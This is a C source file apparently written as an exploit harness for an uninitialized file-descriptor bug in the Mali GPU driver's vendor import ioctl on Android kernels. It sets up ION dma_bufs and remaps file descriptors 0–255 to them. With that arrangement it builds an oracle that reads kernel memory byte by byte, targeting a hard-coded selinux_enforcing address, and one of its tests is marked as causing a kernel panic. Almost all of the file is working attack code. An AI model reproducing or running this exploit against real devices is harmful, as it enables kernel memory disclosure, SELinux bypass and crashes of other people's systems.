/*
 * mali_exploit12.c — Uninitialized fd bug exploitation
 *
 * HYPOTHESIS: When get_user(fd, phandle) fails, fd defaults to 0 (uninitialized).
 * If we dup2(dma_buf, 0), then ANY invalid phandle triggers import of fd=0's dma_buf.
 * 
 * This means the CRASH with phandle=4 happens because:
 * 1. get_user fails (unmapped addr) → fd=0
 * 2. fget(0) → stdin (not dma_buf) → check fails
 * 3. Error handling path has a bug → crash
 *
 * If we make fd=0 a dma_buf FIRST, the import should SUCCEED for phandle=4!
 * This would prevent the crash and prove the uninitialized fd theory.
 *
 * Test 1: Verify oracle (phandle=kernel_addr with fd=0=dma_buf)
 * Test 2: phandle=4 with fd=0=dma_buf → survive crash?
 * Test 3: phandle=kernel_addr to READ kernel value
 * Test 4: Full arbitrary kernel read via controlled fd table
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_dmabuf(void) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc_s) < 0) { close(ion_fd); return -1; }
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share_s) < 0) { close(ion_fd); return -1; }
    return share_s.fd;
}

static int vendor_import(int mali_fd, uint32_t phandle_lo, uint32_t phandle_hi,
                         uint64_t *out_va) {
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = phandle_lo;
    *(uint32_t*)(buf + 12) = phandle_hi;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    if (out_va) *out_va = *(uint64_t*)(buf + 32);
    return ((struct uk_header*)buf)->id;
}

static void vendor_free(int mali_fd, uint64_t gpu_va) {
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);
}

/* ============================================================= */
/* TEST 1: Verify uninitialized fd hypothesis                      */
/* ============================================================= */
static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Verify fd=0 fallback ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    int dma_fd = ion_alloc_dmabuf();
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* Test A: phandle=0xBF000001 (just above typical TASK_SIZE, fails access_ok) */
    /* Without fd=0 being dma_buf → should fail (result=3) */
    uint64_t va;
    int r = vendor_import(mali_fd, 0xBF000001, 0, &va);
    fprintf(stderr, "  A: phandle=0xBF000001, fd0=stdin: result=%u\n", r);

    /* Test B: same but with fd=0 as dma_buf */
    int saved = dup(0);
    dup2(dma_fd, 0);
    r = vendor_import(mali_fd, 0xBF000001, 0, &va);
    fprintf(stderr, "  B: phandle=0xBF000001, fd0=dma_buf: result=%u", r);
    if (r == 0) {
        fprintf(stderr, " gpu_va=0x%llx ← UNINITIALIZED FD BUG CONFIRMED!",
                (unsigned long long)va);
        vendor_free(mali_fd, va);
    }
    fprintf(stderr, "\n");

    /* Test C: phandle=0xC0B7AD54 with fd=0=dma_buf */
    r = vendor_import(mali_fd, 0xC0B7AD54, 0, &va);
    fprintf(stderr, "  C: phandle=0xC0B7AD54, fd0=dma_buf: result=%u", r);
    if (r == 0) {
        fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)va);
        vendor_free(mali_fd, va);
    }
    fprintf(stderr, "\n");

    /* Test D: phandle=0xFFFFFFFF with fd=0=dma_buf */
    r = vendor_import(mali_fd, 0xFFFFFFFF, 0, &va);
    fprintf(stderr, "  D: phandle=0xFFFFFFFF, fd0=dma_buf: result=%u", r);
    if (r == 0) {
        fprintf(stderr, " gpu_va=0x%llx", (unsigned long long)va);
        vendor_free(mali_fd, va);
    }
    fprintf(stderr, "\n");

    dup2(saved, 0);
    close(saved);
    close(dma_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 2: Does fd=0=dma_buf prevent the crash at phandle=4?       */
/* ============================================================= */
static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: phandle=4 with fd0=dma_buf ===\n");
    fprintf(stderr, "  (Previously phandle=4 caused kernel panic!)\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    int dma_fd = ion_alloc_dmabuf();

    int saved = dup(0);
    dup2(dma_fd, 0);

    /* Test with phandle addresses that previously crashed */
    uint32_t addrs[] = {4, 8, 0x100, 0x1000, 0x8000, 0x10000};
    for (int i = 0; i < 6; i++) {
        uint64_t va;
        int r = vendor_import(mali_fd, addrs[i], 0, &va);
        fprintf(stderr, "  phandle=0x%x: result=%u", addrs[i], r);
        if (r == 0) {
            fprintf(stderr, " gpu_va=0x%llx ← SUCCESS (no crash!)",
                    (unsigned long long)va);
            vendor_free(mali_fd, va);
        }
        fprintf(stderr, "\n");
    }

    dup2(saved, 0);
    close(saved);
    close(dma_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 3: Determine if it's truly reading from phandle or using  */
/* fd=0 always. Map memory at phandle with DIFFERENT fd value.     */
/* ============================================================= */
static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: Does kernel actually read from phandle? ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* Create two dma_bufs */
    int dma_fd1 = ion_alloc_dmabuf();
    int dma_fd2 = ion_alloc_dmabuf();
    fprintf(stderr, "  dma_fd1=%d, dma_fd2=%d\n", dma_fd1, dma_fd2);

    /* Map memory with dma_fd2 at known address */
    void *mapped = mmap((void *)0x40000000, 0x10000,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    *(int *)((char *)mapped + 0x1000) = dma_fd2;

    /* dup2 dma_fd1 to fd=0 */
    int saved = dup(0);
    dup2(dma_fd1, 0);

    /* Import with phandle pointing to mapped memory containing dma_fd2 */
    uint64_t va_phandle, va_inval;

    int r1 = vendor_import(mali_fd, 0x40001000, 0, &va_phandle);
    fprintf(stderr, "  phandle=0x40001000 (*phandle=%d=dma_fd2): result=%u gpu_va=0x%llx\n",
            dma_fd2, r1, (unsigned long long)va_phandle);

    /* Import with invalid phandle (falls through to fd=0=dma_fd1) */
    int r2 = vendor_import(mali_fd, 0xBF000001, 0, &va_inval);
    fprintf(stderr, "  phandle=0xBF000001 (invalid, fd0=%d=dma_fd1): result=%u gpu_va=0x%llx\n",
            dma_fd1, r2, (unsigned long long)va_inval);

    /* If kernel reads from phandle: va_phandle uses dma_fd2, va_inval uses dma_fd1 */
    /* If kernel always uses fd=0: both use dma_fd1 (and first import fails) */

    if (r1 == 0 && r2 == 0) {
        if (va_phandle != va_inval)
            fprintf(stderr, "  DIFFERENT VAs → kernel reads from phandle vs fd=0!\n");
        vendor_free(mali_fd, va_phandle);
        vendor_free(mali_fd, va_inval);
    } else if (r1 == 0) {
        fprintf(stderr, "  Only phandle import worked → kernel reads *phandle\n");
        vendor_free(mali_fd, va_phandle);
    } else if (r2 == 0) {
        fprintf(stderr, "  Only invalid import worked → kernel uses fd=0 fallback\n");
        vendor_free(mali_fd, va_inval);
    }

    dup2(saved, 0);
    close(saved);
    munmap(mapped, 0x10000);
    close(dma_fd2);
    close(dma_fd1);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 4: Kernel memory oracle — read specific kernel addresses   */
/* By creating dma_bufs at controlled fd numbers and checking      */
/* which one gets imported via phandle=kernel_addr                 */
/* ============================================================= */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: Kernel value oracle ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* Create dma_bufs for values 0 through 15 */
    int dma_fd = ion_alloc_dmabuf();
    fprintf(stderr, "  Base dma_fd=%d\n", dma_fd);

    /* Save and replace fds 0-15 with dma_bufs */
    int saved_fds[16];
    int replaced[16];
    memset(replaced, 0, sizeof(replaced));

    for (int i = 0; i < 16; i++) {
        saved_fds[i] = dup(i);
        if (saved_fds[i] >= 0 && dup2(dma_fd, i) >= 0) {
            replaced[i] = 1;
        }
    }
    fprintf(stderr, "  Replaced fds 0-15 with dma_bufs\n");

    /* Now test kernel addresses where we KNOW the value */
    struct { uint32_t addr; const char *name; int expected; } targets[] = {
        {0xC0B7AD54, "selinux_enforcing", 1},
        {0xC0B7AD58, "selinux_enforcing+4", -1},
        {0xC00A0000, ".text region", -1},
    };

    for (int t = 0; t < 3; t++) {
        uint64_t va;
        int r = vendor_import(mali_fd, targets[t].addr, 0, &va);
        fprintf(stderr, "  %s (0x%08x): result=%u",
                targets[t].name, targets[t].addr, r);
        if (r == 0) {
            fprintf(stderr, " → VALUE matched one of fds 0-15!");
            vendor_free(mali_fd, va);
        }
        fprintf(stderr, "\n");
    }

    /* Restore fds */
    for (int i = 0; i < 16; i++) {
        if (replaced[i]) {
            dup2(saved_fds[i], i);
            close(saved_fds[i]);
        }
    }

    close(dma_fd);
    close(mali_fd);
}

/* ============================================================= */
/* TEST 5: The REAL test — can we read arbitrary kernel memory?    */
/* Map 256 dma_bufs, one per byte value, then scan kernel addrs   */
/* ============================================================= */
static void test5(void) {
    fprintf(stderr, "\n=== TEST 5: Byte-at-a-time kernel read ===\n");

    /* We need dma_bufs at fd numbers 0-255 */
    /* Step 1: Create a dma_buf */
    int dma_fd = ion_alloc_dmabuf();
    if (dma_fd < 0) { fprintf(stderr, "  No dma_buf\n"); return; }
    fprintf(stderr, "  dma_fd=%d\n", dma_fd);

    /* Step 2: Open mali BEFORE messing with fds */
    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) { close(dma_fd); return; }
    fprintf(stderr, "  mali_fd=%d\n", mali_fd);

    /* Step 3: Save fds and replace with dma_buf */
    /* Be careful: mali_fd and dma_fd must stay alive! */
    int saved_fds[256];
    int can_replace[256];
    memset(can_replace, 0, sizeof(can_replace));

    for (int i = 0; i < 256; i++) {
        /* Don't replace our critical fds */
        if (i == mali_fd || i == dma_fd) { can_replace[i] = 0; continue; }
        saved_fds[i] = dup(i);
        if (saved_fds[i] < 0) {
            /* fd i doesn't exist — create it as dma_buf directly */
            int newfd = dup2(dma_fd, i);
            if (newfd >= 0) can_replace[i] = 2; /* newly created */
        } else if (dup2(dma_fd, i) >= 0) {
            can_replace[i] = 1; /* replaced existing */
        } else {
            close(saved_fds[i]);
        }
    }
    int count = 0;
    for (int i = 0; i < 256; i++) if (can_replace[i]) count++;
    fprintf(stderr, "  Covered %d of 256 byte values\n", count);

    /* Now read selinux_enforcing at 0xC0B7AD54 */
    /* If value is 1, and fd=1 is a dma_buf → import succeeds */
    uint64_t va;
    int r = vendor_import(mali_fd, 0xC0B7AD54, 0, &va);
    fprintf(stderr, "  selinux_enforcing: result=%u\n", r);
    if (r == 0) {
        fprintf(stderr, "  *** VALUE AT 0xC0B7AD54 is a covered fd number! ***\n");
        vendor_free(mali_fd, va);
    }

    /* Try a few more addresses */
    uint32_t scan[] = {
        0xC0B7AD54,  /* selinux_enforcing */
        0xC0B7AD50,  /* nearby */
        0xC0B7AD4C,
        0xC0B7AD48,
    };
    for (int s = 0; s < 4; s++) {
        r = vendor_import(mali_fd, scan[s], 0, &va);
        fprintf(stderr, "  0x%08x: result=%u", scan[s], r);
        if (r == 0) {
            fprintf(stderr, " ← HIT!");
            vendor_free(mali_fd, va);
        }
        fprintf(stderr, "\n");
    }

    /* Restore fds */
    for (int i = 0; i < 256; i++) {
        if (can_replace[i] == 1) {
            dup2(saved_fds[i], i);
            close(saved_fds[i]);
        } else if (can_replace[i] == 2) {
            close(i);
        }
    }

    close(dma_fd);
    close(mali_fd);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Uninitialized FD Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    /* Safe tests: 1, 3, 4, 5 */
    /* TEST 2 IS DANGEROUS — tests phandle=4 which previously crashed */
    if (test == 1 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test1(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASHED: sig %d\n", WTERMSIG(st));
    }
    if (test == 2) {
        fprintf(stderr, "  *** DANGEROUS: phandle=4 test ***\n");
        pid_t p = fork(); if (!p) { alarm(10); test2(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASHED: sig %d\n", WTERMSIG(st));
    }
    if (test == 3 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test3(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASHED: sig %d\n", WTERMSIG(st));
    }
    if (test == 4 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test4(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASHED: sig %d\n", WTERMSIG(st));
    }
    if (test == 5 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test5(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASHED: sig %d\n", WTERMSIG(st));
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
